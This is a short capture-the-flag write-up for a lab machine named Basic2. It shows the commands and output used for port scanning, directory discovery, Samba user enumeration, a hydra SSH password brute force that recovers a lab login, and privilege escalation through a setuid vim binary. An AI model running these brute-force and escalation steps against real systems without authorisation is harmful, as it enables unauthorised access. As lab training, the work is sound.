# NMAP

```bash:Terminal
┌──(vipin㉿vipin)-[~]
└─$ sudo nmap -sS -sV 10.10.178.37 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-02 23:39 EDT
Nmap scan report for 10.10.178.37
Host is up (0.16s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8080/tcp open  http        Apache Tomcat 9.0.7
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.11 seconds
```

# Accessing website

website's homepage seems normal inspect says to check the dev note section

# dirsearch

```bash
┌──(vipin㉿vipin)-[~]
└─$ dirsearch -u $IP --exclude-status 403,404
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/vipin/reports/_10.10.178.37/_24-04-02_23-46-13.txt

Target: http://10.10.178.37/

[23:46:13] Starting: 
[23:46:39] 200 -  475B  - /development/                                     
                                                                             
Task Completed
```

# looking inside of development

dev.txt say smb is working and j.txt says that /etc/shadows password is weak 

# getting username and password

username i used enum2linux

```bash
┌──(vipin㉿vipin)-[~]
└─$ enum4linux -a $IP

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                            
                                                                                                       
S-1-22-1-1000 Unix User\kay (Local User)                                                               
S-1-22-1-1001 Unix User\jan (Local User)

^C
enum4linux complete on Wed Apr  3 00:51:22 2024
```

now that we have the username let use hydra to bruteforce it

```bash
┌──(vipin㉿vipin)-[~]
└─$ hydra -f -l jan -P /usr/share/wordlists/rockyou.txt $IP ssh           

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-03 01:27:09
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.178.37:22/
[STATUS] 166.00 tries/min, 166 tries in 00:01h, 14344234 to do in 1440:12h, 15 active
[STATUS] 105.33 tries/min, 316 tries in 00:03h, 14344084 to do in 2269:39h, 15 active
[STATUS] 105.71 tries/min, 740 tries in 00:07h, 14343660 to do in 2261:24h, 15 active
[22][ssh] host: 10.10.178.37   login: jan   password: armando
[STATUS] attack finished for 10.10.178.37 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-04-03 01:34:46
```

## priv esc

now that we r in the server we need to escalate our privs, i started by looking for suid binaries
```bash
jan@basic2:/$ find / -uid 0 -perm -4000 -type f 2>/dev/null

/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/vim.basic
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/passwd
/bin/su
/bin/ntfs-3g
/bin/ping6
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
```

vim.basic may be useful to read files we dont have permission to

going to /home/kay we see a file called password.bak which needs sudo perms

running vim on the file allows us to see inside to answer the last question